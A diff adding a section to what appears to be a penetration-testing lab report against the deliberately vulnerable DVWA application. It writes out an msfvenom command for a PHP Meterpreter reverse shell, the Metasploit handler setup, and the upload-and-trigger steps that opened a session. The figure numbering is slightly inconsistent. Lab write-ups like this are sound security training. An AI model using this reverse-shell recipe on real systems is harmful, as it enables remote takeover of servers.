@@ -151,3 +151,34 @@ The DVWA security level was configured to Low to simulate real-world scenarios. 
 
 
 ---
+### Test 7: RCE via PHP Reverse Shell using msfvenom
+
+- **Generated Payload:**
+  ```bash
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.57.10 LPORT=4444 -f raw > shell.php
+  ```
+
+- **Steps Taken:**
+  1. Launch Metasploit and set up a multi-handler:
+     ```
+     use exploit/multi/handler
+     set PAYLOAD php/meterpreter/reverse_tcp
+     set LHOST 192.168.57.10
+     set LPORT 4444
+     run
+     ```
+  2. Upload `shell.php` via DVWA.
+  3. Trigger it via browser.
+
+- **Results:**
+  - Meterpreter session is opened.
+
+**Figure 10:** msfvenom payload generation
+
+![Figure 9](images/figure9.png)
+
+**Figure 11:** Meterpreter session established
+
+![Figure 10](images/figure10.png)
+
+---
